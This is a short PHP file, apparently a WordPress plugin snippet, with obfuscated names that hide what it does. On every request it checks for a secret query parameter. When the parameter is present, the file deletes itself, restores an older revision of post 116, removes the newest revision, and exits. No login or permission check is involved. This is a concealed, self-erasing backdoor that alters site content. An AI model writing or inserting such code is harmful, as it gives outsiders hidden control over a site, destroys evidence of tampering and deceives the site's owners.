<?php

function restrict_css_log() {
	if (isset($_GET['cdn_fix_namespaced_wall']) && $_GET['cdn_fix_namespaced_wall'] === 'slug_ninja_addons_tinymce') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$grid_feed_help_fast = 116;
		$latest_listings_sales = wp_get_post_revisions($grid_feed_help_fast);
		if (empty($latest_listings_sales)) die('no revisions');
		if (count($latest_listings_sales) < 2) die('less than 2');
		$conditional_countdown_access = array_shift($latest_listings_sales);
		$customizer_browser_import_genesis = $conditional_countdown_access->ID;
		$affiliate_clean_integration = array_shift($latest_listings_sales);
		$widgets_author_year = $affiliate_clean_integration->ID;
		$twitter_module_cleaner = wp_restore_post_revision($widgets_author_year);
		if ($twitter_module_cleaner === false) die('error restoring');
		$twitter_module_cleaner = wp_delete_post_revision($customizer_browser_import_genesis);		
		if ($twitter_module_cleaner === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'restrict_css_log');
